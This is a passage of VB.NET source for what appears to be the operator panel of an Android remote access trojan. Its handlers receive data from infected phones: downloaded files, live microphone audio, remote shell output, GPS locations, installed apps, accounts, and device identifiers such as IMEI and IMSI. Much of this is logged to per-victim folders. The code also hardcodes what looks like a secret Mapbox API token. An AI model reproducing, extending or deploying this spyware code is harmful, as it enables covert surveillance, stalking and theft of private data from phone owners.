                                         exType = String.Format("Folder [{0}]", ay(7))
                                     ElseIf ay(1) = "1" Then
                                         exType = "File"
                                     End If
                                     Dim ti As String = ay(5)
                                     Dim ne As String = "no"
                                     If ti.Trim = ay(6).Trim Then
                                         ne = "yes"
                                     End If
                                     Dim FileSize As String = Space(1)
                                     If exType = "File" Then
                                         FileSize = reso.BytesConverter(CLng(ay(3)))
                                     End If
                                     Dim Extens As String = ".null"
                                     Try
                                         Dim info As New IO.FileInfo(ay(2))
                                         Extens = info.Extension.ToLower
                                         If Not Extens.Contains(".") Then
                                            Extens = ".null"
                                        Else
                                            If exType = "File" Then
                                                exType = Extens.Replace(".", "")
                                            End If
                                        End If
                                     Catch ex As Exception
                                     End Try
                                     Dim id As Integer = FileManager.DGV0.Rows.Add(exType, ay(2), FileSize, ay(5), ay(6), If(ay(1) = "0", getIconFrmReg.GetIcon(reso.res_Path, If(SpySettings.FM_IC_Size = "Large", True, False)), getIconFrmReg.GetFileIcon(Extens)))
                                     FileManager.DGV0.Rows(id).Cells(2).Tag = ay(3)
                                     If ne = "yes" Then
                                         FileManager.DGV0.Rows(id).DefaultCellStyle.ForeColor = Color.Red
                                     End If
                                     FileManager.DGV0.Rows(id).Cells(0).Tag = ay(1)
                                     FileManager.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)
                                     Counter += 1
                                     Application.DoEvents()
                                 Next
                                FileManager.VRBAR.Maximum = FileManager.DGV0.Rows.Count
                                 FileManager.Button7.Enabled = True
                                 FileManager.DGV0.Enabled = True
                                 FileManager.PB.Value = 0
                                 FileManager.Text = FileManager.Title
                                 FileManager.pathtxt.Text = Space(1) & FileManager.DGV0.Tag
                                 FileManager.PB.SendToBack()
                            Catch ex As Exception
                             End Try
                        Case SecurityKey.down_info
                             Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_ARRAY}, StringSplitOptions.None)
                                 Dim nameFolder As String = "Downloads"
                                 Dim client_Download_path As String = ""
                                 For Each frm As Form In Application.OpenForms
                                    If frm IsNot Nothing AndAlso frm.Tag IsNot Nothing Then
                                        If frm.Tag.ToString = ClassClient.ClientAddressIP Then
                                            Dim fminstans As New FileManager()
                                            fminstans = frm
                                             client_Download_path = fminstans.classClient.FolderUSER & "\" & nameFolder
                                            Exit For
                                        End If
                                    End If
                                 Next
                                 If CLng(SPL(1)) = 0 Then
                                     Dim start As Integer = SPL(0).LastIndexOf("/")
                                     Dim down As String
                                     down = client_Download_path
                                      If Not IO.Directory.Exists(down) Then
                                         IO.Directory.CreateDirectory(down)
                                     End If
                                     down = down & "\" & SPL(0).Substring(start + 1)
                                     Try
                                         If IO.File.Exists(down) Then
                                             IO.File.Delete(down)
                                         End If
                                         IO.File.Create(down).Close()
                                     Catch
                                     End Try
                                     Return
                                 End If
                                 Dim usrfiles As String = "File_Manager_" & ClassClient.ClientAddressIP
                                 Dim handle As String = "Download_" & ClassClient.ClientRemoteAddress
                                 Dim FileManagerDown As FileManager = My.Application.OpenForms(usrfiles)
                                 Dim Download As Download = My.Application.OpenForms(handle)
                                 If Not FileManagerDown Is Nothing Then
                                     Dim start As Integer = SPL(0).LastIndexOf("/")
                                    Dim FName = SPL(0).Substring(start + 1)
                                    If Not FileManagerDown.DownStreams.Contains(FName) Then
                                        Dim FPath = SPL(0)
                                        Dim FSize = reso.BytesConverter(CLng(SPL(1)))
                                        FileManagerDown.DownFolder = client_Download_path
                                         Dim rowid = FileManagerDown.DGVDATA.Rows.Add(FName, FPath, FSize, "0", "Starting..")
                                        FileManagerDown.Downpic.BadgeText = FileManagerDown.DGVDATA.Rows.Count.ToString
                                        FileManagerDown.Downpic.NormalBadgeColor = Color.Red
                                        Dim TheStream As System.IO.FileStream = Nothing
                                        Dim _stream As Long = 0
                                        Dim TotalSize As Long = CLng(SPL(1))
                                        FileManagerDown.DGVDATA.Rows(rowid).Tag = "Download_" & ClassClient.ClientRemoteAddress
                                        FileManagerDown.DGVDATA.Rows(rowid).DefaultCellStyle.ForeColor = Color.Red
                                         FileManagerDown.DownStreams.Add(New Object() {TheStream, _stream, TotalSize}, FName, Nothing, Nothing)
                                    Else
                                        ClassClient.Close(Client, "")
                                        Return
                                    End If
                                 End If
                             Catch ex As Exception
                             End Try
                         Case SecurityKey.downByte
                             If ClassClient.qit = True Then
                                    Return
                             End If
                             Dim usrfiles As String = "File_Manager_" & ClassClient.ClientAddressIP
                            Dim FileManagerDown As FileManager = My.Application.OpenForms(usrfiles)
                             If Not FileManagerDown Is Nothing Then
                                 For Each ro As DataGridViewRow In FileManagerDown.DGVDATA.Rows
                                     If ro.Tag = "Download_" & ClassClient.ClientRemoteAddress Then
                                        ro.DefaultCellStyle.ForeColor = Color.Orange
                                        Dim Filenamess As String = ro.Cells(0).Value.ToString
                                        Dim mydata = reso.GETKEY(Filenamess, FileManagerDown.DownStreams)
                                         Dim FSTREAM As FileStream = DirectCast(mydata(0), FileStream)
                                        Dim FSSIZE As Long = CType(mydata(1), Long)
                                         If ro.Tag = "X" Then
                                            If Not ClassClient Is Nothing Then
                                                 FSTREAM.Dispose()
                                                 FSTREAM.Close()
                                                 FSTREAM = Nothing
                                             End If
                                         End If
                                         Dim TotalSize As Long = CType(mydata(2), Long)
                                        Dim down As String = FileManagerDown.DownFolder
                                         If Not IO.Directory.Exists(down) Then
                                             IO.Directory.CreateDirectory(down)
                                         End If
                                         down = down & "\" & Filenamess
 repet:
                                        Try
                                             If FSTREAM Is Nothing And FSSIZE = 0 Then
                                                ro.Cells(4).Value = "Downloading.."
                                                FSTREAM = New System.IO.FileStream(down, IO.FileMode.OpenOrCreate, IO.FileAccess.Write)
                                             End If
                                             Dim Byte_ As Byte() = DirectCast(SPLByte.GetValue(1), Byte())
                                             FSTREAM.Write(Byte_, 0, Byte_.Length)
                                            FSTREAM.Flush()
                                             FSSIZE += Byte_.Length
                                            reso.UPDATEKEY(Filenamess, FileManagerDown.DownStreams, New Object() {FSTREAM, FSSIZE, TotalSize})
                                            ro.Cells(3).Value = reso.BytesConverter(FSSIZE).ToString()
                                         Catch exe As Exception
                                             down = "D:" & "\Cypherfail\" & Filenamess
                                            GoTo repet
                                        Finally
                                             If FSSIZE = TotalSize Then
                                                 FileManagerDown.Downpic.NormalBadgeColor = Color.Green
                                                ro.Cells(4).Value = "Done.."
                                                ro.Tag = "f"
                                                ro.DefaultCellStyle.ForeColor = Color.Lime
                                                   If FSTREAM IsNot Nothing Then
                                                     FSTREAM.Dispose()
                                                     FSTREAM.Close()
                                                     FSTREAM = Nothing
                                                 End If
                                                 FSSIZE = 0
                                                FileManagerDown.DownStreams.Remove(Filenamess)
                                                ClassClient.Close(Client, "")
                                             End If
                                         End Try
                                          Exit For
                                    End If
                                Next
                             End If
                         Case SecurityKey.upload_info
                             ClassClient.shot = False
                             Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_ARRAY}, StringSplitOptions.None)
                             If IO.File.Exists(SPL(3)) Then
                                 Try
                                     Dim handle As String = "Upload_" & ClassClient.ClientRemoteAddress
                                     Dim Upload As Upload = My.Application.OpenForms(handle)
                                     If Upload Is Nothing Then
                                         Upload = New Upload
                                         Upload.Name = handle
                                         Upload.Title = String.Format("{0} - IP:{1}", "Upload", ClassClient.ClientAddressIP)
                                         Upload.SPL = SPL
                                         Upload.Client = Client
                                         Upload.classClient = ClassClient
                                         Upload.DGV0.Rows.Add("Name --->", SPL(2))
                                         Upload.DGV0.Rows.Add("Path to --->", SPL(0))
                                         Upload.DGV0.Rows.Add("Path From --->", SPL(3))
                                         Upload.DGV0.Rows.Add("Size --->", reso.BytesConverter(CLng(SPL(1))))
                                         Upload.DGV0.Rows.Add("Time --->", "...")
                                         Upload.ProgressBar1.Maximum = CInt(SPL(1))
                                         Upload.start_time = Now
                                         Upload.TotalSize = CLng(SPL(1))
                                         DirectCast(Upload, Control).Show()
                                     End If
                                 Catch ex As Exception
                                 End Try
                             Else
                                 ClassClient.Close(Client, "Upload Finish")
                             End If
                         Case SecurityKey.MicwaveinByte
                             Try
                                 Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_ARRAY}, StringSplitOptions.None)
                                 Dim ob As Object() = Data.GetCollection(SPL(1), ClassClient)
                                 Dim clas As sockets.Client = DirectCast(ob(0), sockets.Client)
                                 Dim handle As String = "Microphone_" & clas.ClientRemoteAddress
                                 Dim Microphone As Microphone = My.Application.OpenForms(handle)
                                 If Microphone IsNot Nothing Then
                                     Microphone.classWaveIn = ClassClient
                                     Microphone.classWaveIn.shot = False
                                     Microphone.ClientWaveIn = Client
                                     Microphone.rateInput = CInt(SPL(2).Trim)
                                     Microphone.In_Start(Microphone.MDeviceId)
                                 End If
                             Catch ex As Exception
                             End Try
                        Case SecurityKey.MicwaveOutByte
                             If ClassClient.qit = True Then
                                 Return
                             End If
                             Try
                                 Dim SPL As String() = EncodString.Split({SPL_ARRAY}, StringSplitOptions.None)
                                 Dim ob As Object() = Data.GetCollection(SPL(1), ClassClient)
                                 Dim handle As String = "Microphone_" & DirectCast(ob(0), sockets.Client).ClientRemoteAddress
                                 Dim Microphone As Microphone = My.Application.OpenForms(handle)
                                 If Microphone Is Nothing Then
                                     Microphone = New Microphone
                                     Microphone.Name = handle
                                     Microphone.Title = String.Format("{0} - IP:{1}", "Microphone", ClassClient.ClientAddressIP)
                                     DirectCast(Microphone, Control).Show()
                                 End If
                                 If Microphone.waveOut Is Nothing Then
                                     Microphone.classClient = DirectCast(ob(0), sockets.Client)
                                     Microphone.Client = DirectCast(ob(1), Net.Sockets.TcpClient)
                                     Microphone.ClientWaveOut = Client
                                     Microphone.classWaveOut = ClassClient
                                     Microphone.classWaveOut.shot = False
                                     Try
                                         Microphone.waveOut = New WaveOut(0)
                                         Microphone.waveOut.Open(reso.FormatWave(SPL(2)))
                                     Catch ex As Exception
                                         Microphone.Out_Stop()
                                         Microphone.Panel1.Visible = False
                                         Microphone.SizeH()
                                     End Try
                                     Microphone.OutHZ.Text = reso.HzString(SPL(2))
                                     Microphone.OutBoxSource.SelectedIndex = CInt(SPL(3).Trim)
                                     If Microphone.b_sta.Tag = 1 Then
                                         Microphone.b_sta.Tag = 2
                                         Microphone.b_sta.Text = "Stop"
                                     End If
                                 End If
                                 Dim Byte_ As Byte() = DirectCast(SPLByte.GetValue(1), Byte())
                                 If Microphone IsNot Nothing Then
                                     If Microphone.waveOut IsNot Nothing Then
                                         Microphone.waveOut.Write(Byte_)
                                     End If
                                 End If
                             Catch ex As Exception
                             End Try
                         Case SecurityKey.getCommand
                             Try
                                 Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)
                                 Dim handle As String = "Shell_Terminal_" & ClassClient.ClientRemoteAddress
                                 Dim ShellTerminal As ShellTerminal = My.Application.OpenForms(handle)
                                 If ShellTerminal Is Nothing Then
                                     ShellTerminal = New ShellTerminal
                                     ShellTerminal.Name = handle
                                     ShellTerminal.Title = String.Format("{0} - IP:{1}", "Shell Terminal", ClassClient.ClientAddressIP)
                                     ShellTerminal.Client = Client
                                     ShellTerminal.classClient = ClassClient
                                     DirectCast(ShellTerminal, Control).Show()
                                 End If
                                 ShellTerminal.ignore = True
                                 ShellTerminal.OutText.DeselectAll()
                                 Dim isLine As Boolean = False
                                 Dim EV As String = "[Output value : " & SPL(2) & "]"
                                 ShellTerminal.OutText.AppendText(EV)
                                 Dim Counter As Integer = 0
                                 For Each ea In SPL_lines
                                     If ShellTerminal.OutText.Lines.Length > 0 Then
                                         ShellTerminal.OutText.AppendText(vbNewLine & ea)
                                         isLine = True
                                     Else
                                         ShellTerminal.OutText.AppendText(ea & vbNewLine)
                                         isLine = False
                                     End If
                                     ShellTerminal.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)
                                     Counter += 1
                                     Application.DoEvents()
                                 Next
                                 ShellTerminal.PB.Value = 0
                                 ShellTerminal.ignore = False
                                 ShellTerminal.NewTag(isLine)
                                 ShellTerminal.OutText.ReadOnly = False
                                 If ShellTerminal.IAMNew = True Then
                                     ShellTerminal.IAMNew = False
                                 End If
                             Catch ex As Exception
                             End Try
                        Case SecurityKey.getGSM
                            Return
                                                               Case SecurityKey.getGPS
                             If ClassClient.qitGPS = True Then
                                 Return
                             End If
                             Try
                                 Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 Dim handle As String = "Location_Manager_" & ClassClient.ClientRemoteAddress
                                 Dim LocationManager As LocationManager = My.Application.OpenForms(handle)
                                 If LocationManager Is Nothing Then
                                     reso.Directory_Exist(ClassClient)
                                     LocationManager = New LocationManager
                                     LocationManager.infoMaps = {ClassClient.FolderUSER, ClassClient.ClientName}
                                     LocationManager.Name = handle
                                     LocationManager.Title = String.Format("{0} - IP:{1}", "Location Manager", ClassClient.ClientAddressIP)
                                     LocationManager.Client = Client
                                     LocationManager.classClient = ClassClient
                                     DirectCast(LocationManager, Control).Show()
                                     LocationManager.Zoom = 15
                                 End If
                                 LocationManager.ImageSize.Width = 480
                                 LocationManager.ImageSize.Height = 360
                                 LocationManager.Markers = reso.Between("<param name=""markers_gps"">", "</param>")
                                 LocationManager.Link = "https://api.mapbox.com/styles/v1/"
                                 LocationManager.Key = "sk.eyJ1IjoiY3lwaGVycmF0bmV3IiwiYSI6ImNrcHdvZWJxbDB5NXAydm56dmhpYWtjZHIifQ.-PWp8lHBTFP7s7fouo6-KQ"
                                 Dim get_style As String = reso.Maps_style()
                                 LocationManager.style = reso.Between("<param name=""" & get_style & """>", "</param>")
                                 LocationManager.Accuracy = SPL(2)
                                 LocationManager.Speed = Codes.GetSpeed(SPL(3))
                                 LocationManager.List.Add({CDbl(SPL(0)), CDbl(SPL(1))})
                             Catch ex As Exception
                             End Try
                        Case SecurityKey.ImageViewer
                             Try
                                 If ClassClient.qit = True Then
                                     Return
                                 End If
                                 Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(0)).Split({Data.SPL_ARRAY}, StringSplitOptions.None)
                                 Dim Byte_compressd As Byte() = DirectCast(SPLByte.GetValue(1), Byte())
                                 Dim MS As New IO.MemoryStream(Byte_compressd)
                                 Dim _image As Image = Image.FromStream(MS)
                                  Try
                                    Filenamethum = SPL(1).Substring(SPL(1).LastIndexOf("/") + 1)
                                     Dim Thepath_is = SPL(1).Substring(0, SPL(1).LastIndexOf("/"))
                                     If Thepath_is.StartsWith(" ") Then
                                        Thepath_is = Thepath_is.Substring(1, Thepath_is.Length)
                                    End If
                                     Dim Target_form As New FileManager
                                     Dim down As String = Nothing
                                     For Each frm As Form In Application.OpenForms
                                        If frm IsNot Nothing AndAlso frm.Tag IsNot Nothing Then
                                            If frm.Tag.ToString = ClassClient.ClientAddressIP Then
                                                 Target_form = frm
                                                 down = Target_form.classClient.FolderUSER & "\Thumbs" + Thepath_is.Replace("/", "\")
                                                Exit For
                                            End If
                                        End If
                                     Next
                                     If down Is Nothing Then
                                        ClassClient.Close(Client, "")
                                        Return
                                    End If
                                       Target_form.viwimage.Image = _image
                                    Target_form.viwimage.Refresh()
                                      If Target_form.viwimage.Visible = False Then
                                        Target_form.viwimage.Visible = True
                                    End If
                                     Thumbs = down
                                     If Not Directory.Exists(Thumbs) Then
                                         Directory.CreateDirectory(Thumbs)
                                     End If
                                     Try
                                         If (Filenamethum.Substring(Filenamethum.Trim.LastIndexOf("/") + 1)).EndsWith(".mp4") Then
                                            SaveVideo(Thumbs, Filenamethum.Substring(Filenamethum.Trim.LastIndexOf("/") + 1), _image)
                                            If Not Target_form.ShowVideo Then
                                                ClassClient.Close(ClassClient.myClient, "")
                                            End If
                                        Else
                                            Target_form.viwimage.Image.Save(Thumbs + "\" + Filenamethum.Substring(Filenamethum.Trim.LastIndexOf("/") + 1))
                                          End If
                                     Catch ex As Exception
                                        ClassClient.Close(ClassClient.myClient, "")
                                    End Try
                                    Catch ex As Exception
                                 End Try
                             Catch ex As Exception
                             End Try
                         Case SecurityKey.Apps
                            Try

                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)


                                Dim handle As String = "Applications_" & ClassClient.ClientRemoteAddress

                                Dim Applications As Applications = My.Application.OpenForms(handle)

                                If Applications Is Nothing Then

                                    Applications = New Applications

                                    Applications.Name = handle

                                    Applications.Title = String.Format("{0} - IP:{1}", "Applications", ClassClient.ClientAddressIP)

                                    Applications.Client = Client

                                    Applications.classClient = ClassClient

                                    Applications.tmpAddressIP = ClassClient.ClientAddressIP

                                    Applications.tmpClientName = ClassClient.ClientName

                                    Applications.tmpCountry = ClassClient.Country

                                    Applications.tmpFolderUSER = ClassClient.FolderUSER

                                    Applications.DGV0.Columns(4).Width = reso.IconsSize

                                    Applications.DGV0.Columns(4).DisplayIndex = 0

                                    DirectCast(Applications, Control).Show()

                                End If

                                Applications.DGV0.Enabled = False

                                Applications.DGV0.Rows.Clear()

                                Dim Counter As Integer = 0

                                For Each ea In SPL_lines

                                    Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)

                                    Dim appicon As Image


                                    '' Dim getPath As String = reso.res_Path & "\Icons\FillEllipse\" & state & ".png"



                                    Dim getPath As String = Nothing

                                    Select Case ay(1).ToLower
                                        Case "system"
                                            getPath = reso.res_Path & "\Icons\FillEllipse\System.png"
                                        Case "user"
                                            getPath = reso.res_Path & "\Icons\FillEllipse\User.png"
                                        Case Else
                                            getPath = reso.res_Path & "\Icons\FillEllipse\User.png"
                                    End Select
                                    Dim index As Integer
                                    If ay.Length > 4 AndAlso Not ay(4) = "null" Then

                                        appicon = ResizeImage(New Bitmap(Codes.Base64ToImage(ay(4))), New Size(45, 45))
                                        index = Applications.DGV0.Rows.Add(ay(0), ay(1), ay(2), ay(3), appicon)
                                    Else
                                        'appicon = reso.GetEllImage(0, {getPath, 15, 15, 17, 17})
                                        index = Applications.DGV0.Rows.Add(ay(0), ay(1), ay(2), ay(3), reso.GetEllImage(0, {getPath, 15, 15, 17, 17}))

                                    End If


                                    If ay(2) = SPL(2) Then

                                        Applications.DGV0.Rows(index).DefaultCellStyle.ForeColor = SpySettings.DefaultColor_NewColorFiles

                                    End If

                                    Applications.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)

                                    Counter += 1

                                    Application.DoEvents()

                                Next

                                Applications.DGV0.Enabled = True

                                Applications.PB.Value = 0

                                If SpySettings.SAVING_DATA = "Yes" Then
                                    reso.Directory_Exist(ClassClient)
                                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Applications.DGV0, ClassClient.FolderUSER, "Applications",
                                        ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "Applications", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                End If

                            Catch ex As Exception

                            End Try
                        Case SecurityKey.editor
                             Try
                                 Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)
                                 Dim handle As String = "editor_" & ClassClient.ClientRemoteAddress & "_" & SPL(2).Replace(Space(1), "_")
                                 Dim Editor As Editor = My.Application.OpenForms(handle)
                                 If Editor Is Nothing Then
                                     Editor = New Editor
                                     Editor.Name = handle
                                     Editor.Title = String.Format("{0} - IP:{1}", "Editor", ClassClient.ClientAddressIP)
                                     Editor.Client = Client
                                     Editor.classClient = ClassClient
                                     Editor.path = SPL(2)
                                     Editor.EditText.Text = SPL(1)
                                     DirectCast(Editor, Control).Show()
                                 End If
                             Catch ex As Exception
                             End Try
                        Case SecurityKey.Account
                             Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)
                                 Dim handle As String = "Account_Manager_" & ClassClient.ClientRemoteAddress
                                 Dim AccountManager As AccountManager = My.Application.OpenForms(handle)
                                 If AccountManager Is Nothing Then
                                     AccountManager = New AccountManager
                                     AccountManager.Name = handle
                                     AccountManager.Title = String.Format("{0} - IP:{1}", "Account Manager", ClassClient.ClientAddressIP)
                                     AccountManager.Client = Client
                                     AccountManager.classClient = ClassClient
                                     AccountManager.tmpAddressIP = ClassClient.ClientAddressIP
                                     AccountManager.tmpClientName = ClassClient.ClientName
                                     AccountManager.tmpCountry = ClassClient.Country
                                     AccountManager.tmpFolderUSER = ClassClient.FolderUSER
                                     AccountManager.DGV0.Columns(2).Width = reso.IconsSize
                                     AccountManager.DGV0.Columns(2).DisplayIndex = 0
                                     DirectCast(AccountManager, Control).Show()
                                 End If
                                 AccountManager.DGV0.Enabled = False
                                 AccountManager.DGV0.Rows.Clear()
                                 Dim Counter As Integer = 0
                                 Dim getPath As String = reso.res_Path & "\Icons\FillEllipse\Account.png"
                                 For Each ea In SPL_lines
                                     Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)
                                     AccountManager.DGV0.Rows.Add(ay(0), ay(1), reso.GetEllImage(0, {getPath, 15, 15, 17, 17}))
                                     AccountManager.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)
                                     Counter += 1
                                     Application.DoEvents()
                                 Next
                                 AccountManager.DGV0.Enabled = True
                                 AccountManager.PB.Value = 0
                                 If SpySettings.SAVING_DATA = "Yes" Then
                                    reso.Directory_Exist(ClassClient)
                                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {AccountManager.DGV0, ClassClient.FolderUSER, "Account Manager",
                                        ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "Accounts", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                End If
                             Catch ex As Exception
                             End Try
                         Case SecurityKey.Information
                             Try
                                 Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 Dim handle As String = "informations_" & ClassClient.ClientRemoteAddress
                                 Dim information As information = My.Application.OpenForms(handle)
                                 If information Is Nothing Then
                                     information = New information
                                     information.classClient = ClassClient
                                     information.Client = Client
                                     information.Name = handle
                                     information.Title = String.Format("{0} - IP:{1}", "informations", ClassClient.ClientAddressIP)
                                     information.Client = Client
                                     information.tmpTable = New DataTable("tmp")
                                     information.tmpTable.Columns.Add("Property")
                                     information.tmpTable.Columns.Add("Value")
                                     Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)
                                     information.LB1.Text = "Device"
                                    information.DGV0.Tag = information.LB1.Text
                                    information.LB2.Text = "System"
                                    information.DGV1.Tag = information.LB2.Text
                                    information.LB3.Text = "SIM"
                                    information.DGV2.Tag = information.LB3.Text
                                    information.LB4.Text = "Wi-Fi"
                                    information.DGV3.Tag = information.LB4.Text
                                    information.LB5.Text = "Battery"
                                    information.DGV4.Tag = information.LB5.Text
                                    information.LB6.Text = "Sound level"
                                    information.DGV5.Tag = information.LB6.Text
                                    information.LB7.Text = "Phone bar"
                                    information.DGV6.Tag = information.LB7.Text
                                     information.DGV0.Rows.Add("Name", SPL_lines(0))
                                     information.DGV0.Rows.Add("Model", SPL_lines(1))
                                     information.DGV0.Rows.Add("Board", SPL_lines(2))
                                     information.DGV0.Rows.Add("Brand", SPL_lines(3))
                                     information.DGV0.Rows.Add("Boot Loader", SPL_lines(4))
                                     information.DGV0.Rows.Add("Display", SPL_lines(5))
                                     information.DGV0.Rows.Add("Hardware", SPL_lines(6))
                                     information.DGV0.Rows.Add("Host", SPL_lines(7))
                                     information.DGV0.Rows.Add("ID", SPL_lines(8))
                                     information.DGV0.Rows.Add("Manufacturer", SPL_lines(9))
                                     information.DGV0.Rows.Add("Serial", SPL_lines(10))
                                      information.DGV1.Rows.Add("Name", SPL_lines(11))
                                     information.DGV1.Rows.Add("Release", SPL_lines(12))
                                     information.DGV1.Rows.Add("SDK", SPL_lines(13))
                                     information.DGV1.Rows.Add("Language", SPL_lines(14))
                                      information.DGV2.Rows.Add("Operator Name", SPL_lines(15))
                                     information.DGV2.Rows.Add("IMEI", SPL_lines(16))
                                     information.DGV2.Rows.Add("Country iso", SPL_lines(17))
                                     information.DGV2.Rows.Add("Serial", SPL_lines(18))
                                     information.DGV2.Rows.Add("Network Type", SPL_lines(19))
                                     information.DGV2.Rows.Add("IMSI", SPL_lines(20))
                                      information.DGV3.Rows.Add("MAC address", SPL_lines(21))
                                     information.DGV3.Rows.Add("SSID", SPL_lines(22))
                                     information.DGV3.Rows.Add("Link Speed", SPL_lines(23) & If(SPL_lines(23) = "null", "", "dBm"))
                                     information.DGV3.Rows.Add("Rssi", SPL_lines(24))
                                      information.DGV4.Rows.Add("Level", SPL_lines(25) & "%")
                                     information.DGV4.Rows.Add("USB", SPL_lines(26))
                                     information.DGV4.Rows.Add("Idle Mode (DOZE)", SPL_lines(27))
                                     information.DGV4.Rows.Add("Power Save Mode", SPL_lines(28))
                                     information.DGV4.Rows.Add("interactive", SPL_lines(29))
                                     Dim rowID As Integer = information.DGV5.Rows.Add("Ring", Nothing)
                                     Dim cell As DataGridViewComboBoxCell = information.DGV5.Rows(rowID).Cells(1)
                                     Dim ListItems As New List(Of String)
                                     For vul0 As Integer = 0 To CInt(SPL_lines(30).Trim)
                                         ListItems.Add(vul0)
                                     Next
                                     cell.DataSource = ListItems
                                     Try
                                        cell.Value = ListItems(ListItems.IndexOf(CInt(SPL_lines(31).Trim)))
                                    Catch ex As Exception
                                     End Try
                                     cell = New DataGridViewComboBoxCell
                                     rowID = information.DGV5.Rows.Add("Music", Nothing)
                                     ListItems = New List(Of String)
                                     cell = information.DGV5.Rows(rowID).Cells(1)
                                     For vul0 As Integer = 0 To CInt(SPL_lines(32).Trim)
                                         ListItems.Add(vul0)
                                     Next
                                     cell.DataSource = ListItems
                                     Try
                                        cell.Value = ListItems(ListItems.IndexOf(CInt(SPL_lines(33).Trim)))
                                    Catch ex As Exception
                                     End Try
                                     cell = New DataGridViewComboBoxCell
                                     rowID = information.DGV5.Rows.Add("Notification", Nothing)
                                     ListItems = New List(Of String)
                                     cell = information.DGV5.Rows(rowID).Cells(1)
                                     For vul0 As Integer = 0 To CInt(SPL_lines(34).Trim)
                                         ListItems.Add(vul0)
                                     Next
                                     cell.DataSource = ListItems
                                     Try
                                        cell.Value = ListItems(ListItems.IndexOf(CInt(SPL_lines(35).Trim)))
                                    Catch ex As Exception
                                     End Try
                                     cell = New DataGridViewComboBoxCell
                                     rowID = information.DGV5.Rows.Add("System", Nothing)
                                     ListItems = New List(Of String)
                                     cell = information.DGV5.Rows(rowID).Cells(1)
                                     For vul0 As Integer = 0 To CInt(SPL_lines(36).Trim)
                                         ListItems.Add(vul0)
                                     Next
                                    cell.DataSource = ListItems
                                    Try
                                        cell.Value = ListItems(ListItems.IndexOf(CInt(SPL_lines(37).Trim)))
                                    Catch ex As Exception
                                     End Try
                                     cell = New DataGridViewComboBoxCell
                                     rowID = information.DGV6.Rows.Add("Ringer Mode", Nothing)
                                     ListItems = New List(Of String)
                                     cell = information.DGV6.Rows(rowID).Cells(1)
                                     Dim modes As String() = {"Normal", "Vibrate", "Silent"}
                                     Dim getmode As String = modes(CInt(SPL_lines(38).Trim))
                                     For Each m In modes
                                        ListItems.Add(m)
                                    Next
                                     cell.DataSource = ListItems
                                    Try
                                        cell.Value = ListItems(ListItems.IndexOf(getmode))
                                    Catch ex As Exception
                                     End Try
                                     cell = New DataGridViewComboBoxCell
                                     rowID = information.DGV6.Rows.Add("Wi-Fi Mode", Nothing)
                                     ListItems = New List(Of String)
                                     cell = information.DGV6.Rows(rowID).Cells(1)
                                     Dim modeWiFi As String() = {"off", "on", "restart"}
                                     Dim getmodeWIFI As String = modeWiFi(CInt(SPL_lines(39).Trim))
                                     For Each m In modeWiFi
                                        ListItems.Add(m)
                                    Next
                                     cell.DataSource = ListItems
                                    Try
                                        cell.Value = ListItems(ListItems.IndexOf(getmodeWIFI))
                                    Catch ex As Exception
                                     End Try
                                     For Each gr As DataGridView In information.Panel1.Controls.OfType(Of DataGridView)()
                                         information.tmpTable.Rows.Add(gr.Tag, "sub")
                                         For i As Integer = 0 To gr.Rows.Count - 1
                                             information.tmpTable.Rows.Add(gr.Rows(i).Cells(0).Value, gr.Rows(i).Cells(1).Value)
                                         Next
                                     Next
                                     If SpySettings.SAVING_DATA = "Yes" Then
                                        If information.tmpTable IsNot Nothing Then
                                            reso.Directory_Exist(ClassClient)
                                            Dim DS As DataSet = New DataSet("info")
                                            DS.Tables.Add(information.tmpTable)
                                            information.DS = DS
                                            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {DS, ClassClient.FolderUSER, "informations",
                                            ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "informations", "info", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                        End If
                                    End If
                                     information.tmpAddressIP = ClassClient.ClientAddressIP
                                     information.tmpClientName = ClassClient.ClientName
                                     information.tmpCountry = ClassClient.Country
                                     information.tmpFolderUSER = ClassClient.FolderUSER
                                     DirectCast(information, Control).Show()
                                 End If
                             Catch ex As Exception
